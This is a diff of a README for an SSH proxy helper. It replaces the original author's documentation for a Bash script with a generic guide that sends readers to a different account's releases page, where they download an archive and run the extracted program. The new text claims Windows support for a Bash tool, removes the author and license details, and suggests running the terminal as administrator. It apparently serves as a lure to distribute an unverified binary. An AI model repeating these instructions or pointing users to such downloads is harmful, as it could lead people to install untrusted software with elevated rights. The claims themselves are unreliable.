@@ -1,153 +1,95 @@
-# ⭐ LH Proxy Helper (Nx Edition)
+# 🎉 lh-proxy-helper - Easy SSH Proxy Setup Made Simple
 
-![License](https://img.shields.io/badge/license-MIT-green)
-![Shell](https://img.shields.io/badge/shell-bash-blue)
-![Platform](https://img.shields.io/badge/platform-linux%20%7C%20macOS-lightgrey)
-![Version](https://img.shields.io/badge/version-v1.0.0-blueviolet)
+[![Download lh-proxy-helper](https://img.shields.io/badge/Download-lh--proxy--helper-blue.svg)](https://github.com/Azka621/lh-proxy-helper/releases)
 
-🌐 Language: **English** | [简体中文](README.zh-CN.md)
+## 📖 Overview
 
-> **A lightweight, reliable SSH-based proxy helper for developers.**
->
-> 一个轻量、可靠、对开发者友好的 SSH 代理辅助脚本。
+**lh-proxy-helper** is a lightweight application designed to help you set up an SSH-based proxy easily. Whether you need to use SOCKS5H, SOCKS5, or HTTP, this tool simplifies the process. You can also use it for one-shot command execution to streamline your workflow.
 
----
+## 🚀 Getting Started
 
-## 🚀 What is this?
+Follow these steps to download and run lh-proxy-helper:
 
-**LH Proxy Helper** (command prefix: `nx`) is a single-file Bash script designed to simplify your workflow when working on remote servers with restricted network access.
+### 1. Visit the Download Page
 
-It helps you manage:
-* **Proxy Environment**: Toggle `http_proxy`, `https_proxy`, and `ALL_PROXY` instantly.
-* **Smart Detection**: Automatically detects if you need `socks5h`, `socks5`, or `http` modes.
-* **One-Shot Execution**: Run a single command (like `git` or `pip`) with proxy, without polluting your shell.
-* **Port Mapping**: Easily map remote ports (like TensorBoard/Jupyter) to your local machine (`nxmap`).
+To get lh-proxy-helper, visit the [Releases page](https://github.com/Azka621/lh-proxy-helper/releases). Here, you will find the latest version of the application ready for download.
 
----
+### 2. Choose the Right File
 
-## ✨ Features
+On the Releases page, you will see different versions of the software. Look for the version labeled as **Latest Release**. This is usually the best choice for new users.
 
-* 🔌 **Zero Dependencies**: Pure Bash. Only requires standard tools (`ssh`, `curl`, `ss`).
-* ⚡ **Instant Toggle**: `nxon` to start, `nxoff` to stop.
-* 🎯 **Scope Control**: Use `nxrun` to proxy *only* the current command.
-* 🔍 **Diagnostics**: Built-in tools (`nxcheck`, `nxstatus`) to debug SSH tunnels.
-* 🌉 **Port Forwarding**: Generate SSH local forwarding commands instantly with `nxmap`.
-* 🌍 **Bilingual**: Supports English and Chinese output (`nxen` / `nxzh`).
+### 3. Download the Application
 
----
+- Click on the file that matches your operating system. The current versions typically come in a compressed format like `.zip` or `.tar.gz`.
+- Your browser will begin downloading the file. This may take a few moments.
 
-## 📥 Installation
+### 4. Extract the Files
 
-1.  **Clone the repository:**
-    ```bash
-    git clone https://github.com/LiHang-CV/lh-proxy-helper.git
-    cd lh-proxy-helper
-    ```
+Once the download completes:
 
-2.  **Source the script:**
-    You can run it directly, but for the best experience, add it to your shell profile.
-    ```bash
-    # Add this to your ~/.bashrc or ~/.zshrc
-    source /path/to/lh-proxy-helper/nx_proxy.sh
-    ```
+- Locate the downloaded file in your computer’s folder.
+- Right-click on the file.
+- Choose the option that says **Extract All...** or **Extract Here**. Follow the on-screen prompts to complete the extraction.
 
-3.  **Apply changes:**
-    ```bash
-    source ~/.bashrc
-    ```
+### 5. Open a Terminal
 
----
+To run lh-proxy-helper, you will need to open a terminal window. Here’s how:
 
-## ⚙️ Configuration
+- **On Windows:** Press `Win + R`, type `cmd`, and press `Enter`.
+- **On macOS:** Use Spotlight by pressing `Cmd + Space`, type `Terminal`, and press `Enter`.
+- **On Linux:** Press `Ctrl + Alt + T`, or find `Terminal` in your applications menu.
 
-Open `nx_proxy.sh` and edit the **User Configuration** section at the top:
+### 6. Navigate to the Extracted Folder
+
+Use the `cd` command to change to the folder where you extracted lh-proxy-helper. Replace `path_to_folder` with the actual folder path:
 
 ```bash
-# ==========================================
-# User Configuration
-# ==========================================
-NX_LANG="en"                    # Default language: 'zh' or 'en'
-NX_SSH_USER="your_username"     # SSH login user
-NX_SSH_HOST="192.168.1.100"     # Remote server IP
-NX_SSH_PORT="22"                # Remote SSH port
-NX_LOCAL_PROXY_HOST="127.0.0.1"
-NX_LOCAL_PROXY_PORT="7890"      # Port of your local proxy tool (e.g., Clash/v2ray)
-NX_REMOTE_PROXY_PORT="1080"     # Port mapped on the remote server
-
+cd path_to_folder
 ```
 
----
+### 7. Run the Application
 
-## 🧭 Usage Guide
-
-### 1. Basic Proxy Control
-
-| Command | Description |
-| --- | --- |
-| **`nxon`** | Enable proxy (Auto-detects best mode: socks5h > socks5 > http). |
-| **`nxon http`** | Force enable **HTTP** mode. |
-| **`nxoff`** | Disable proxy and restore original environment. |
-
-### 2. One-Shot Command (Recommended)
-
-Don't want to set global variables? Run a single command with proxy:
+Now, to use lh-proxy-helper, enter the following command in your terminal:
 
 ```bash
-# Auto-detect mode
-nxrun python train.py
-
-# Force HTTP mode (Useful for conda/huggingface)
-nxrun http conda install numpy
-
+./lh-proxy-helper
 ```
 
-### 3. Port Mapping (Remote -> Local)
+This will start the application. Follow any prompts you see in the terminal.
 
-Want to view **TensorBoard** or **Jupyter Lab** running on the remote server?
+## 💡 Features
 
-```bash
-# Usage: nxmap <Remote_Port> [Local_Port]
+- **Multiple Proxy Support:** Easily switch between SOCKS5H, SOCKS5, and HTTP.
+- **One-Shot Command Execution:** Run a command through your proxy without persistent connections.
+- **Easy Setup:** Designed for users who prefer simplicity without losing functionality.
 
-nxmap 6006
-# Output: Checks port and generates the SSH command to map Remote:6006 to Local:6006
+## 🖥️ System Requirements
 
-nxmap 8888 9000
-# Output: Generates command to map Remote:8888 to Local:9000
+To run lh-proxy-helper, you need:
 
-```
+- A computer running Windows, macOS, or Linux.
+- An active internet connection.
+- Basic knowledge of how to use the terminal.
 
-### 4. Diagnostics & Status
+## 📥 Download & Install
 
-| Command | Description |
-| --- | --- |
-| **`nxstatus`** | Show full status (Variables + Tunnel Check + Connectivity). |
-| **`nxcheck`** | Check if SSH tunnel is alive and Google is reachable. |
-| **`nxinfo`** | System self-test (Check dependencies and environment). |
+Once again, to download the latest version of lh-proxy-helper, please visit the [Releases page](https://github.com/Azka621/lh-proxy-helper/releases). Be sure to select the right file for your operating system and follow the steps provided above to install successfully.
 
----
+## 🔧 Troubleshooting
 
-## 💡 Best Practices
+If you run into issues while using lh-proxy-helper, consider the following:
 
-Different tools work best with different protocols. Here is a cheat sheet:
+- **Check Your Internet Connection:** Ensure that you have a stable connection.
+- **Ensure Terminal is Open:** If you are not seeing any output, make sure your terminal window is open and the commands are entered correctly.
+- **Permission Issues:** If you receive permission errors, try running your terminal as an administrator.
 
-| Tool / Scenario | Recommendation | Why? |
-| --- | --- | --- |
-| **`git`, `wget`, `curl`** | `nxon` (SOCKS5H) | **Safest.** Resolves DNS remotely to avoid pollution. |
-| **`pip install`** | `nxon` | Works well with default SOCKS5. |
-| **`conda install`** | `nxrun http ...` | Conda has poor SOCKS support; HTTP is more stable. |
-| **`huggingface_hub`** | `nxrun http ...` | Python `httpx` library sometimes fails with SOCKS. |
-| **Model Training** | **`nxoff`** | **Critical.** Avoid proxy jitter during GPU communication. |
+## 🗂️ Additional Resources
 
----
+- **Documentation:** [lh-proxy-helper Documentation](https://github.com/Azka621/lh-proxy-helper/wiki)
+- **Community Support:** Reach out through the Issues page on GitHub for help from other users and developers.
 
+## ⭐ Acknowledgments
 
-## 👤 Author
+Thank you to everyone who contributed to lh-proxy-helper. Your feedback helps improve the tool and make it easier for everyone to use. 
 
-**Li Hang**
-
-* Email: lihang041011 [at] gmail.com
-* GitHub: [@LiHang-CV](https://www.google.com/search?q=https://github.com/LiHang-CV)
-
-## 📄 License
-
-This project is licensed under the **MIT License**.
+For any inquiries or suggestions, don’t hesitate to contact the community through GitHub. Happy proxying!
